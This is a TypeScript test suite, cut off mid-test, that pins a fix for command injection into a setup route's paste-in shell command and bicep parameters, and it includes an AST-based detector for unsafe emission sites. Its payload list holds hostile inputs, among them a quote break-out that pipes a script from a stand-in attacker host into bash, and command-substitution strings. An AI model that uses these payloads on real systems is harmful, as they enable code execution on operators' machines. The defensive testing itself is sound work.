/**
 * Security regression tests for POST /api/setup/identity (#3610).
 *
 * THE DEFECT
 * ----------
 * POST returns two artifacts the product tells a PRIVILEGED HUMAN to use: a
 * `bootstrapScript` shell command to paste into a terminal, and a set of bicep
 * `deployParams`. Both were assembled by interpolating request text straight
 * into single-quoted words with no validation at all:
 *
 *     `EXISTING_CLIENT_ID='${…existingClientId…}'`
 *     `CONSOLE_HOSTS='${consoleHosts}'`
 *     deployParams.loomMsalClientId       = `'${…existingClientId…}'`
 *     deployParams.loomTenantAdminGroupId = `'${adminGroupId}'`
 *
 * One `'` in any of those closes the quoted word, and everything after it is
 * shell syntax in a command line that already carries KEYVAULT_NAME and
 * CONSOLE_RG and ends in `bash scripts/csa-loom/bootstrap-msal-app-reg.sh`.
 * Same class as GHSA-fj7j-qq8g-hqj8 (wire-existing); the sink is the operator's
 * terminal rather than `execSync`.
 *
 * WHAT THIS FILE PINS, AND WHY IN THIS SHAPE
 * ------------------------------------------
 * 1. THE WHOLE POPULATION, NOT ONE FIELD. There are FOUR interpolation sinks
 *    fed by THREE distinct caller-controlled fields (`existingClientId` reaches
 *    two of them — the shell command AND the bicep params, which are separate
 *    paste targets). A test covering only `existingClientId` would pass while
 *    `consoleHosts` and `groupId` stayed wide open — and `consoleHosts` is not
 *    even sent by the wizard UI, so it is reachable ONLY by a direct API call
 *    and is exactly what a UI-driven test would miss. Every field is exercised
 *    against every payload below.
 *
 * 2. AN EMBEDDED POSITIVE CONTROL. Before this PR there was no test of this
 *    route at all (`app/api/setup/__tests__/` had nine specs, none for
 *    `identity`), so a new guard starts from ZERO population and a green run
 *    would be indistinguishable from a run that never executed the route. The
 *    `accepts a legitimate choice` case is that control: it asserts the route
 *    is reachable and that a VALID payload still produces a working command
 *    with the values intact. If the module failed to import or the refusal
 *    logic refused everything, that case goes red.
 *
 * 3. AN EMISSION-SITE INVARIANT (the anti-narrow-bypass control). Per-field
 *    tests only cover the fields that exist today, so the last describe block
 *    reads THIS ROUTE'S SOURCE and classifies every place a value can reach one
 *    of the two paste targets.
 *
 *    The FIRST version of this control counted syntax: exactly one raw `'${…}'`
 *    in the file, and exactly five `q('` calls. That is blind to any sink that
 *    is not a template literal, and the blindness was measured, not theorised —
 *    review of this PR added a sixth sink by CONCATENATION,
 *
 *        deployParams.loomTenantHint = "'" + (((body as any).tenantHint) || "") + "'";
 *
 *    and the counts stayed at 1 and 5: RC=0, 36/36 green, with a live
 *    bicep-literal break-out reaching the response. The counting invariant is
 *    retained (it still catches the template shape — measured RC=1) and it is
 *    still load-bearing: it is what catches an added `q('` call, and the region
 *    interpolation count is what catches an added `${…}` in the emitted text.
 *    {@link unsafeEmissions} widens that — it classifies emission SITES rather
 *    than counting one syntax. Since #3955 it does so on the AST
 *    (`ts.createSourceFile`) over the WHOLE `POST` handler body, in four rules:
 *    a `deployParams.<key> =` whose right-hand side is neither a static literal
 *    nor a `q()` call with a literal field name; a `${…}` that is not itself a
 *    `q()` call; a `+` that joins anything other than literals this file
 *    authored; and — the rule that did not exist — an ELEMENT of an emitted
 *    array that does not positively classify as one of those shapes.
 *
 *    Each rule is pinned by a control below that mutates the real source in
 *    memory, plus a DISCRIMINATING control proving a correctly-routed sixth
 *    sink is accepted — without it, "flags everything" would look identical to
 *    a working classifier. The four shapes #3955 measured GREEN against the
 *    previous, text-scanning revision (A, D′, G, I) each have their own pinned
 *    control. `emitted deployParams keys` is a further, independent detector
 *    that works at RUNTIME and so does not depend on source syntax at all.
 *
 * No test in this file contacts Graph, Azure, or a shell.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
// #3955 — the emission-site classifier walks NODES, not text. `typescript` is
// already a devDependency of this app (it is what `tsc` and the security-graph
// extractor run on), so this adds no new dependency.
import ts from 'typescript';

// ── session: a signed-in operator (so the tests exercise validation, not 401) ──
const getSessionMock = vi.fn(
  () => ({ claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 }) as any,
);
vi.mock('@/lib/auth/session', () => ({
  getSession: () => getSessionMock(),
  tenantScopeId: (s: any) => s?.claims?.tid ?? s?.claims?.oid,
}));

// The route builds a UAMI credential at MODULE scope and calls Graph in GET.
// Neither may reach the network here.
vi.mock('@/lib/azure/arm-credential', () => ({
  uamiArmCredential: () => ({ getToken: async () => null }),
}));
vi.mock('@/lib/auth/msal', () => ({ graphBase: () => 'https://graph.example.invalid' }));

/** A syntactically valid Entra application id / group object id. */
const VALID_CLIENT_ID = 'bbbbbbbb-cccc-dddd-eeee-ffffffffffff';
const VALID_GROUP_ID = '11111111-2222-3333-4444-555555555555';

function postReq(body: any) {
  return { url: 'http://x/api/setup/identity', json: async () => body } as any;
}

beforeEach(() => {
  getSessionMock.mockReturnValue({
    claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' },
    exp: Date.now() / 1000 + 3600,
  } as any);
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.resetModules();
});

/**
 * The payload shapes that break OUT of a single-quoted shell word, plus the
 * bicep-literal equivalents. `'` ends the quoted word; `$(…)`/backticks
 * substitute a command; `\n` starts a new one; `;`/`|`/`&&` chain one.
 */
const INJECTION_PAYLOADS: Array<[string, string]> = [
  ['quote break-out + command', "x' ; curl http://evil.invalid/s.sh | bash ; '"],
  ['single quote alone', "x'"],
  ['command substitution', 'x$(id)'],
  ['backticks', 'x`id`'],
  ['newline', 'x\necho pwned'],
  ['semicolon', 'x;echo pwned'],
  ['pipe', 'x|echo pwned'],
  ['embedded whitespace', 'x y'],
  ['bicep literal break-out', "x' , loomMsalAppReg: '"],
];

/**
 * Every caller-controlled field that reaches an interpolation sink, with the
 * request shape that makes the route actually EMIT it. `existingClientId`
 * appears once but feeds TWO sinks (bootstrapScript + deployParams).
 */
const CALLER_SINKS: Array<{
  field: string;
  body: (payload: string) => any;
}> = [
  {
    field: 'appRegistration.existingClientId',
    body: (p) => ({ appRegistration: { mode: 'existing', existingClientId: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'appRegistration.consoleHosts',
    body: (p) => ({ appRegistration: { mode: 'new', consoleHosts: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'bootstrapAdmin.groupId',
    body: (p) => ({ appRegistration: { mode: 'new' }, bootstrapAdmin: { mode: 'group', groupId: p } }),
  },
];

describe('POST /api/setup/identity — operator-terminal command injection (#3610)', () => {
  // The cross-product: EVERY caller sink against EVERY payload. Scoping this to
  // one field is the narrow bypass that passes CI while the route stays open.
  for (const sink of CALLER_SINKS) {
    it.each(INJECTION_PAYLOADS)(
      `refuses ${sink.field} carrying %s, and emits no command`,
      async (_label, payload) => {
        const { POST } = await import('../identity/route');
        const res = await POST(postReq(sink.body(payload)), undefined as any);

        expect(res.status).toBe(400);
        const j = await res.json();
        expect(j.ok).toBe(false);
        expect(j.field).toBe(sink.field);

        // The load-bearing assertion: NEITHER paste target was produced. The
        // whole response is serialized and searched, so a payload surfacing in
        // deployParams, in bootstrapScript, or anywhere else fails this.
        const serialized = JSON.stringify(j);
        expect(serialized).not.toContain(payload);
        expect(j.apply).toBeUndefined();
      },
    );
  }

  it('refuses an existingClientId that is not a GUID (both sinks, one refusal)', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({ appRegistration: { mode: 'existing', existingClientId: 'not-a-guid' }, bootstrapAdmin: { mode: 'self' } }),
      undefined as any,
    );
    expect(res.status).toBe(400);
    const j = await res.json();
    expect(j.field).toBe('appRegistration.existingClientId');
    expect(j.apply).toBeUndefined();
  });

  it('refuses a consoleHosts entry that carries a scheme or a path', async () => {
    const { POST } = await import('../identity/route');
    for (const bad of ['https://loom.example.com', 'loom.example.com/callback', 'loom.example.com:8443']) {
      const res = await POST(
        postReq({ appRegistration: { mode: 'new', consoleHosts: bad }, bootstrapAdmin: { mode: 'self' } }),
        undefined as any,
      );
      expect(res.status).toBe(400);
      expect((await res.json()).field).toBe('appRegistration.consoleHosts');
    }
  });

  // ── EMBEDDED POSITIVE CONTROL ──────────────────────────────────────────────
  // Proves the route is reachable and the refusals above are discriminating
  // rather than blanket. Without this, a module that threw on import — or a
  // validator that refused everything — would look identical to a passing run.
  it('accepts a legitimate choice and emits the command with the values intact', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({
        appRegistration: { mode: 'existing', existingClientId: VALID_CLIENT_ID, consoleHosts: 'loom.example.com, csa-loom.example.org' },
        bootstrapAdmin: { mode: 'group', groupId: VALID_GROUP_ID },
      }),
      undefined as any,
    );

    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.applied).toBe(false);
    // The shell command carries both values, single-quoted, and the host list
    // is re-emitted in NORMALIZED form (the caller's stray space is gone —
    // the route emits what it rebuilt from validated tokens, not the raw text).
    expect(j.apply.bootstrapScript).toContain(`EXISTING_CLIENT_ID='${VALID_CLIENT_ID}'`);
    expect(j.apply.bootstrapScript).toContain("CONSOLE_HOSTS='loom.example.com,csa-loom.example.org'");
    expect(j.apply.bootstrapScript).toContain('bash scripts/csa-loom/bootstrap-msal-app-reg.sh');
    // The bicep params carry them too — the second paste target.
    expect(j.apply.deployParams.loomMsalClientId).toBe(`'${VALID_CLIENT_ID}'`);
    expect(j.apply.deployParams.loomTenantAdminGroupId).toBe(`'${VALID_GROUP_ID}'`);
  });

  it('still accepts the default new/self choice with no optional fields', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.appRegistration.mode).toBe('new');
    // The session oid is interpolated too — it is not caller-controlled, but it
    // still passes through the sink guard, so it must survive unchanged.
    expect(j.apply.deployParams.loomTenantAdminOid).toBe("'aaaaaaaa-1111-2222-3333-444444444444'");
  });

  it('an unauthenticated POST gets the byte-exact 401 the hand-rolled prologue returned', async () => {
    getSessionMock.mockReturnValue(null as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(401);
    // withSession → apiUnauthorized() → apiError('unauthenticated', 401).
    // MEASURED equal to the prologue it replaced, not assumed (L4 §4).
    expect(await res.json()).toEqual({ ok: false, error: 'unauthenticated' });
  });
});

describe('POST /api/setup/identity — sink-count invariant', () => {
  /** The route source, verbatim (CRLF preserved). */
  function routeSource(): string {
    return fs.readFileSync(path.join(__dirname, '..', 'identity', 'route.ts'), 'utf8');
  }

  /** Comments stripped, so the worked examples in the module docblock are not
   *  mistaken for live sinks. */
  function stripComments(src: string): string {
    // CRLF-safe: `[\s\S]` and `[^\n]` both work regardless of \r placement.
    return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
  }

  function routeCode(): string {
    return stripComments(routeSource());
  }

  it('has exactly ONE raw quoted interpolation, and it is inside q()', () => {
    const code = routeCode();
    // A control on the control: the strip must not have eaten the file.
    expect(code).toContain('export const POST');
    expect(code.length).toBeGreaterThan(1000);

    const rawSinks = code.match(/'\$\{/g) ?? [];
    // ONE — the `return `'${value}'`` inside q(), which is where the inertness
    // assertion lives. A second one means a value reaches a shell/bicep literal
    // without passing INERT_VALUE_RE.
    //
    // This is a NECESSARY condition, not a sufficient one: it sees template
    // interpolation only, so it is blind to a sink built by concatenation.
    // `unsafeEmissions` below closes that WITHIN the emission region; do not
    // read this assertion as "no sink can be added silently", and do not read
    // the pair of them that way either (#3955).
    expect(rawSinks.length).toBe(1);
    expect(code).toMatch(/function q\([^)]*\)[^{]*\{[\s\S]*?INERT_VALUE_RE\.test\(value\)[\s\S]*?'\$\{value\}'/);
  });

  it('routes every emitted value through q() with a named field', () => {
    const code = routeCode();
    const calls = code.match(/\bq\('/g) ?? [];
    // Five emission sites: loomMsalClientId, loomTenantAdminOid,
    // loomTenantAdminGroupId, CONSOLE_HOSTS, EXISTING_CLIENT_ID.
    expect(calls.length).toBe(5);
  });

  // ── EMBEDDED CONTROL FOR L2 ───────────────────────────────────────────────
  // The q() inertness check is a guard whose population is EMPTY as long as the
  // L1 allow-lists hold: every caller field is refused with 400 before it can
  // reach a sink, so a test driving a caller field proves L1 and says nothing
  // about L2. Measured, not theorised — disabling the INERT_VALUE_RE assertion
  // while leaving L1 intact left all 65 tests GREEN (mutation M3). A guard that
  // survives its own removal is not a guard.
  //
  // `session.claims.oid` is L2's LIVE population: it is interpolated into
  // `deployParams.loomTenantAdminOid` and has no L1 allow-list by design (it is
  // not caller input). q() is therefore the ONLY thing between a claim value
  // and an emitted bicep literal, and this case exercises exactly that.
  it('q() refuses a non-inert SESSION-derived value — the sink L1 does not cover', async () => {
    const hostile = "aaaa' , loomMsalAppReg: { enabled: false } , x: '";
    getSessionMock.mockReturnValue({ claims: { oid: hostile, upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);

    // Fails CLOSED through withSession's catch → apiServerError (500). What
    // matters is that nothing was emitted, not which status it chose.
    expect(res.status).toBe(500);
    const serialized = JSON.stringify(await res.json());
    expect(serialized).not.toContain(hostile);
    expect(serialized).not.toContain('loomMsalAppReg');
  });

  it('q() lets an inert session oid through unchanged (the discriminating half)', async () => {
    // Without this, "refuses everything" would look identical to a working
    // guard. Synthetic/dev sessions really do carry non-GUID oids like
    // `oid-test`, and those are inert, so they must still work.
    getSessionMock.mockReturnValue({ claims: { oid: 'oid-test', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    expect((await res.json()).apply.deployParams.loomTenantAdminOid).toBe("'oid-test'");
  });
});

// ───────────────────────────────────────────────────────────────────────────
// EMISSION-SITE INVARIANT — the anti-narrow-bypass control, on the AST (#3955)
// ───────────────────────────────────────────────────────────────────────────
// Why this exists rather than the two counting assertions above: review of
// #3929 defeated those by writing the sixth sink with `+` instead of `${}`.
// Counts stayed at 1 and 5; RC=0, 36/36; and a bicep-literal break-out landed
// verbatim in a paste target. Counting ONE syntax cannot support the claim
// "a sink cannot be added silently".
//
// THE REGEX VERSION OF THIS CLASSIFIER COULD NOT EITHER, AND #3955 MEASURED
// EXACTLY WHERE IT STOPPED. Mutating the real route and running this real
// suite, FOUR shapes stayed green at 45/45:
//
//   A   a bare member expression as an ELEMENT of the command array — no
//       assignment, no `${…}`, no `+`, so no rule looked at it at all.
//   D′  `deployParams.<k> =` whose RHS merely MENTIONS `q(`, with a VARIABLE
//       q-argument (so the `q('` count is unchanged) and the write guarded by a
//       field no runtime case sends (so the emitted-key pin never sees it).
//   G   a concatenation sink in the RESPONSE OBJECT, past `REGION_END`.
//   I   an EARLIER `return NextResponse.json({` relocating `REGION_END`; the
//       region shrank but still cleared every floor, and the sink landed beyond
//       it.
//
// All four are consequences of classifying TEXT instead of NODES:
//   • the region was `[indexOf('const deployParams'), indexOf(first return))`,
//     so everything outside it was unclassified (G) and the end marker could be
//     MOVED by adding an earlier return (I);
//   • rule 1 tested for the SUBSTRING `q(` rather than for provenance (D′);
//   • there was no POSITIVE shape rule, so an expression that is not an
//     assignment, an interpolation or a concatenation was simply not a shape
//     any rule considered (A).
//
// So the classifier is now a `ts.createSourceFile` walk over the WHOLE POST
// handler body. That removes all four root causes structurally rather than by
// adding a fourth regex:
//   • SCOPE is the handler's own AST subtree — there is no end marker to move
//     (closes I) and nothing inside the handler is out of scope (closes G);
//   • every emitted expression must POSITIVELY classify as safe, so an
//     unrecognised shape is a finding rather than a gap (closes A);
//   • `q()` is recognised as a CALL to the identifier `q` with a literal field
//     name, not as the presence of the characters `q(` (closes D′).
// Comments are not AST nodes, so the walk is also immune to a sink "hidden" in
// a docblock without any stripping step.
//
// KNOWN SCOPE, stated rather than implied: the walk covers the POST handler.
// GET emits no paste target, and module-scope helpers (`q`, `requireGuid`,
// `normalizeConsoleHosts`) are pinned by the behavioural tests above. A value
// assembled at module scope and merely REFERENCED inside POST would reach a
// sink as a bare Identifier — which does not classify as safe, so it is a
// finding, not a hole.
// ───────────────────────────────────────────────────────────────────────────

/** The INERTNESS gate every emitted caller value must pass, by name. */
const SINK_FN = 'q';

/** A string-producing literal with no interpolation — a constant the route
 *  authored itself, which no caller can influence. */
function isStaticStringLiteral(n: ts.Node): boolean {
  return ts.isStringLiteral(n) || ts.isNoSubstitutionTemplateLiteral(n);
}

/** `q('<literal field name>', …)` — a CALL to the sink gate, not a mention of
 *  it. The field label must be a literal: that is what makes the label
 *  meaningful in `UnsafeInterpolationError`, and it is what closes D′, whose
 *  whole trick was a variable q-argument that kept the `q('` count unchanged. */
function isSinkCall(n: ts.Node): boolean {
  return (
    ts.isCallExpression(n)
    && ts.isIdentifier(n.expression)
    && n.expression.text === SINK_FN
    && n.arguments.length >= 1
    && isStaticStringLiteral(n.arguments[0])
  );
}

/**
 * Is `n` an expression this route may EMIT into a paste target?
 *
 * POSITIVE by construction: an unrecognised shape is NOT safe. That inversion
 * is the fix for A — the regex classifier asked "does this look dangerous?",
 * which has an unbounded set of answers, and this asks "is this one of the
 * shapes we accept?", which has a listed one.
 */
function isSafeEmittedExpr(n: ts.Node): boolean {
  if (ts.isParenthesizedExpression(n)) return isSafeEmittedExpr(n.expression);
  if (ts.isAsExpression(n) || ts.isTypeAssertionExpression(n)) return isSafeEmittedExpr(n.expression);
  // Constants the route authored.
  if (isStaticStringLiteral(n) || ts.isNumericLiteral(n)) return true;
  if (n.kind === ts.SyntaxKind.NullKeyword) return true;
  if (n.kind === ts.SyntaxKind.TrueKeyword || n.kind === ts.SyntaxKind.FalseKeyword) return true;
  if (ts.isIdentifier(n) && n.text === 'undefined') return true;
  // The inertness gate.
  if (isSinkCall(n)) return true;
  // `a ? safe : safe`, `cond && safe`, `safe || safe` — the shapes the command
  // array legitimately uses to include/exclude an element.
  if (ts.isConditionalExpression(n)) {
    return isSafeEmittedExpr(n.whenTrue) && isSafeEmittedExpr(n.whenFalse);
  }
  if (ts.isBinaryExpression(n)) {
    const op = n.operatorToken.kind;
    if (op === ts.SyntaxKind.AmpersandAmpersandToken || op === ts.SyntaxKind.BarBarToken
      || op === ts.SyntaxKind.QuestionQuestionToken) {
      // The LEFT of `&&` is a predicate, not emitted text; the right is.
      return op === ts.SyntaxKind.AmpersandAmpersandToken
        ? isSafeEmittedExpr(n.right)
        : isSafeEmittedExpr(n.left) && isSafeEmittedExpr(n.right);
    }
    if (op === ts.SyntaxKind.PlusToken) return isStaticConcat(n);
    return false;
  }
  // A template is safe only when EVERY interpolation is a sink call.
  if (ts.isTemplateExpression(n)) {
    return n.templateSpans.every((s) => isSinkCall(unwrap(s.expression)));
  }
  return false;
}

/** Strip parens / `as` so a shape test sees the expression itself. */
function unwrap(n: ts.Expression): ts.Expression {
  let cur: ts.Expression = n;
  while (ts.isParenthesizedExpression(cur) || ts.isAsExpression(cur)) cur = cur.expression;
  return cur;
}

/**
 * A `+` chain whose every LEAF is a static literal.
 *
 * This distinction is the reason the region could not simply be widened to the
 * whole handler with the old CONCAT regex, and #3955 measured that too: the
 * honest `note:` string in the response object is built by static
 * concatenation, so a blanket "no `+` in the emitted scope" rule produces THREE
 * findings on the clean, unmutated head. Static-only concatenation cannot carry
 * caller text; concatenation with an expression operand is exactly the #3929
 * bypass.
 */
function isStaticConcat(n: ts.Node): boolean {
  const e = ts.isParenthesizedExpression(n) ? n.expression : n;
  if (isStaticStringLiteral(e) || ts.isNumericLiteral(e)) return true;
  if (ts.isBinaryExpression(e) && e.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    return isStaticConcat(e.left) && isStaticConcat(e.right);
  }
  return false;
}

/** The POST handler's body — the emission scope. `null` = could not be found. */
function postHandlerBody(sf: ts.SourceFile): ts.Node | null {
  let found: ts.Node | null = null;
  const visit = (n: ts.Node): void => {
    if (found) return;
    if (ts.isVariableDeclaration(n) && ts.isIdentifier(n.name) && n.name.text === 'POST' && n.initializer) {
      let fn: ts.Node | null = null;
      const findFn = (m: ts.Node): void => {
        if (fn) return;
        if (ts.isArrowFunction(m) || ts.isFunctionExpression(m)) { fn = m; return; }
        ts.forEachChild(m, findFn);
      };
      findFn(n.initializer);
      if (fn) found = (fn as ts.ArrowFunction | ts.FunctionExpression).body;
      return;
    }
    if (ts.isFunctionDeclaration(n) && n.name?.text === 'POST' && n.body) { found = n.body; return; }
    ts.forEachChild(n, visit);
  };
  visit(sf);
  return found;
}

/** Every `deployParams.<key> = <rhs>` write inside the emission scope. */
function deployParamSites(scope: ts.Node): Array<{ key: string; rhs: ts.Expression }> {
  const sites: Array<{ key: string; rhs: ts.Expression }> = [];
  const visit = (n: ts.Node): void => {
    if (
      ts.isBinaryExpression(n)
      && n.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isPropertyAccessExpression(n.left)
      && ts.isIdentifier(n.left.expression)
      && n.left.expression.text === 'deployParams'
    ) {
      sites.push({ key: n.left.name.text, rhs: unwrap(n.right) });
    }
    ts.forEachChild(n, visit);
  };
  visit(scope);
  return sites;
}

/** Everything the walk classified, so a floor can prove it was not vacuous. */
export interface EmissionPopulation {
  deployParamWrites: number;
  arrayElements: number;
  interpolations: number;
  concatenations: number;
  scopeChars: number;
}

/**
 * THE GUARD. Returns one finding per way a value could reach a paste target
 * without passing q()'s inertness assertion. Empty means the route is clean.
 */
function unsafeEmissions(code: string): string[] {
  return classifyEmissions(code).findings;
}

function classifyEmissions(code: string): { findings: string[]; population: EmissionPopulation } {
  const empty: EmissionPopulation = {
    deployParamWrites: 0, arrayElements: 0, interpolations: 0, concatenations: 0, scopeChars: 0,
  };
  const sf = ts.createSourceFile('route.ts', code, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const scope = postHandlerBody(sf);
  // Fail CLOSED if the scope vanished: a classifier that silently found nothing
  // to classify is the empty-population failure, not a pass.
  if (!scope) {
    return {
      findings: ['emission scope not found — the POST handler body could not be located'],
      population: empty,
    };
  }

  const findings: string[] = [];
  const pop: EmissionPopulation = { ...empty, scopeChars: scope.getText().length };
  const text = (n: ts.Node) => n.getText().replace(/\s+/g, ' ').slice(0, 160);

  // (1) deployParams writes: static literal, or routed through q(). Nothing else.
  //     PROVENANCE, not substring presence — that is what closes D′.
  for (const s of deployParamSites(scope)) {
    pop.deployParamWrites++;
    if (isSafeEmittedExpr(s.rhs)) continue;
    findings.push(`deployParams.${s.key} is neither a static literal nor a q() call: ${text(s.rhs)}`);
  }
  // (1b) …and the only way to write deployParams is that form.
  if (/deployParams\s*\[/.test(code)) findings.push('deployParams written by computed key');
  if (/Object\.assign\s*\(\s*deployParams/.test(code)) findings.push('deployParams written by Object.assign');

  const visit = (n: ts.Node): void => {
    // (2) every interpolation in the emitted text IS a q() call.
    if (ts.isTemplateExpression(n)) {
      for (const span of n.templateSpans) {
        pop.interpolations++;
        if (!isSinkCall(unwrap(span.expression))) {
          findings.push(`interpolation not routed through q(): \${${text(span.expression)}}`);
        }
      }
    }
    // (3) concatenation may only join literals the route authored itself.
    if (ts.isBinaryExpression(n) && n.operatorToken.kind === ts.SyntaxKind.PlusToken) {
      pop.concatenations++;
      if (!isStaticConcat(n)) {
        findings.push(`string concatenation in the emission region: ${text(n)}`);
      }
    }
    // (4) POSITIVE SHAPE — every element of an emitted array must classify.
    //     This is the rule that did not exist, and A is exactly what fell
    //     through its absence.
    if (ts.isArrayLiteralExpression(n)) {
      for (const el of n.elements) {
        if (ts.isSpreadElement(el)) { findings.push(`spread element in an emitted array: ${text(el)}`); continue; }
        pop.arrayElements++;
        if (!isSafeEmittedExpr(unwrap(el))) {
          findings.push(`array element is not a static literal, a q() call, or a conditional over those: ${text(el)}`);
        }
      }
    }
    ts.forEachChild(n, visit);
  };
  visit(scope);

  // De-duplicate: a nested `+` chain is visited as part of its parent AND on its
  // own, and the same finding twice is noise, not signal.
  return { findings: Array.from(new Set(findings)), population: pop };
}

describe('POST /api/setup/identity — emission-site invariant', () => {
  function routeSource(): string {
    return fs.readFileSync(path.join(__dirname, '..', 'identity', 'route.ts'), 'utf8');
  }
  function stripComments(src: string): string {
    return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
  }
  function mutate(src: string, needle: string, replacement: string): string {
    // CRLF landmine: an LF-written needle matches ZERO times, and a control
    // that mutated nothing is indistinguishable from a control that passed.
    expect(src.split(needle).length - 1).toBe(1);
    return src.replace(needle, replacement);
  }

  /** Where the reviewer's N1 landed: immediately before the shell command. */
  const ANCHOR_PARAMS = '  const bootstrapCmd =';
  /** An element of the shell-command array — the OTHER paste target. */
  const ANCHOR_CMD = "          'CONSOLE_APP_NAME=loom-console CONSOLE_RG=<admin-rg>',";

  it('the live route has no unsafe emission site', () => {
    // No comment-stripping step: comments are not AST nodes (#3955).
    expect(unsafeEmissions(routeSource())).toEqual([]);
  });

  it('the classifier has a real population (floor, so it cannot pass vacuously)', () => {
    const code = routeSource();
    const { population } = classifyEmissions(code);

    // The scope exists and is the handler, not a fragment.
    expect(population.scopeChars).toBeGreaterThan(400);

    // Every `deployParams.<key> =` token the file contains was actually PARSED
    // into a site. The regex here is the INDEPENDENT count: if the AST walk ever
    // stopped finding writes (a renamed identifier, a changed assignment shape)
    // the guard would go quiet, and this is the check that notices. Comments are
    // excluded from the token count because they are excluded from the walk.
    const tokens = stripComments(code).match(/deployParams\.\w+\s*=(?!=)/g) ?? [];
    expect(population.deployParamWrites).toBe(tokens.length);
    // Seven writes today (3 appModes × their params, + oid, + groupId). A floor,
    // not an equality: adding a SAFE site must not require editing this number.
    expect(population.deployParamWrites).toBeGreaterThanOrEqual(7);

    // The two q()-wrapped shell values are the only interpolations in scope.
    expect(population.interpolations).toBe(2);
    // The command array is classified element-by-element — the rule that did not
    // exist before #3955. Five elements today; a floor, not an equality.
    expect(population.arrayElements).toBeGreaterThanOrEqual(5);
    // The honest `note:` string is a static-literal `+` chain, so the walk DOES
    // see concatenations on the clean head and accepts them. If this hit zero,
    // rule 3 would be running over an empty population.
    expect(population.concatenations).toBeGreaterThanOrEqual(3);
  });

  it('CONTROL — a purely STATIC concatenation is accepted, not flagged', () => {
    // The trap #3955 warned about: widening the scope to the whole handler with
    // a blanket "no `+`" rule produces THREE findings on the clean head, because
    // the response `note:` is assembled from literals. A classifier that flagged
    // those would be deleted by the first person who read it.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      "  const staticNote = 'one ' + 'two ' + 'three';\r\n  void staticNote;\r\n" + ANCHOR_PARAMS,
    );
    expect(unsafeEmissions(mutated)).toEqual([]);
  });

  // ── PINNED BYPASS CONTROLS ────────────────────────────────────────────────
  // Each mutates the REAL source in memory and asserts the classifier flags it.
  // These are the cases that shipped GREEN before this control existed; they are
  // pinned so the classifier cannot be refactored back into blindness.

  it('CONTROL N1 — a sixth deployParams sink built by CONCATENATION is flagged', () => {
    // Verbatim from the review of PR #3929. Measured on the pre-fix tree:
    // rawSinks=1, qCalls=5, RC=0, 36/36 green — undetected, and exploitable.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  deployParams.loomTenantHint = "\'" + (((body as any).tenantHint) || "") + "\'";\r\n' + ANCHOR_PARAMS,
    );
    const code = stripComments(mutated);

    const findings = unsafeEmissions(code);
    expect(findings.join('\n')).toContain('loomTenantHint');
    expect(findings.length).toBeGreaterThan(0);

    // And the reason a new control was needed: the two counting assertions are
    // blind to this shape. Measured here, in the same run, so the claim in the
    // docblock is checked rather than remembered.
    expect((code.match(/'\$\{/g) ?? []).length).toBe(1);
    expect((code.match(/\bq\('/g) ?? []).length).toBe(5);
  });

  it('CONTROL N2 — a shell-command element built by CONCATENATION is flagged', () => {
    // The same shape aimed at the other paste target. Also measured RC=0 on the
    // pre-fix tree.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          "TENANT_HINT=\'" + (((body as any).tenantHint) || "") + "\'",\r\n' + ANCHOR_CMD,
    );
    const findings = unsafeEmissions(stripComments(mutated));
    expect(findings.join('\n')).toContain('string concatenation in the emission region');
  });

  it('CONTROL N3 — a raw template interpolation is still flagged (old detection retained)', () => {
    // The shape the counting invariant already caught. Pinned so that widening
    // the guard cannot quietly cost the coverage it already had.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          `TENANT_HINT=\'${((body as any).tenantHint) || ""}\'`,\r\n' + ANCHOR_CMD,
    );
    const code = stripComments(mutated);
    expect(unsafeEmissions(code).join('\n')).toContain('interpolation not routed through q()');
    expect((code.match(/'\$\{/g) ?? []).length).toBe(2);
  });

  it('CONTROL N5 — an UNQUOTED dynamic deployParams value is flagged', () => {
    // N1 is caught by TWO of the three rules, so it cannot detect the removal
    // of either one on its own. N5 is caught by the deployParams-site rule
    // ALONE: no quote literal, no `+` on a literal, no `${…}`. It is also a real
    // sink — an unquoted bicep param value is exactly how caller text becomes
    // bicep syntax rather than a bicep string.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  deployParams.loomTenantHint = String((body as any).tenantHint);\r\n' + ANCHOR_PARAMS,
    );
    const findings = unsafeEmissions(stripComments(mutated));
    expect(findings.join('\n')).toContain('loomTenantHint is neither a static literal nor a q() call');
  });

  it('CONTROL N4 — a sixth sink CORRECTLY routed through q() is accepted', () => {
    // The discriminating half. Without it, a classifier that flagged everything
    // would look identical to one that works, and the first person to add a
    // legitimate parameter would be told to delete the guard. Note it reads the
    // LIVE file, so it also fails when the live route is itself unsafe — that is
    // intended: every control here is grounded in the real source, not a fixture
    // that models what the code was assumed to look like.
    const mutated = mutate(
      routeSource(),
